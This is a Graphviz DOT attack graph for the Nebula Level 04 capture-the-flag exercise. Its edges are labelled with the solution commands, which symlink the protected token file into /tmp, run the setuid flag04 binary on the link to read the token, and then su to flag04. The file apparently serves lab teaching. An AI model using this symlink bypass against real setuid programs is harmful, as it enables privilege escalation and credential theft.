digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 04"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Token path identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Symlink bypass prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="flag04 token recovered"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag04 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="ls -l /home/flag04"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="ln -s /home/flag04/token /tmp/lnk"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="/home/flag04/flag04 /tmp/lnk"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="su - flag04"];
}
